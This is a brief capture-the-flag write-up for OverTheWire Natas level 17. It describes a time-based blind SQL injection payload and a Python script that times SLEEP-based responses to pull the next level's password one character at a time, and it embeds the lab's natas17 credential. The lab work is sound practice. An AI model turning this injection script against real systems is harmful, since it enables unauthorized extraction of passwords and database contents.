![image](https://github.com/user-attachments/assets/b8ab139b-a819-4240-af56-ca7bdb26ffef)

![image](https://github.com/user-attachments/assets/ce02fb76-2068-4659-9d45-d163fe3cdfb8)


This is similar to previous level. No input validation.

" OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) -- 

This makes the server sleep for 5 when the given condition is true. we can make a script to automate this.

****import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org/"
auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')  # 🔁 Replace with actual password

charset = string.ascii_letters + string.digits
found = ""
max_length = 32

print("[*] Extracting password for natas18...")

for i in range(1, max_length + 1):
    for ch in charset:
        payload = f'natas18" AND IF(SUBSTRING(password,{i},1)="{ch}", SLEEP(3), 0) -- '
        start = time.time()
        response = requests.post(url, auth=auth, data={'username': payload})
        elapsed = time.time() - start

        print(f"[*] Trying: {found + ch} ({elapsed:.2f}s)")

        if elapsed >= 3:
            found += ch
            print(f"[+] Match: {found}")
            break

print(f"\n✅ Password for natas18: {found}")****
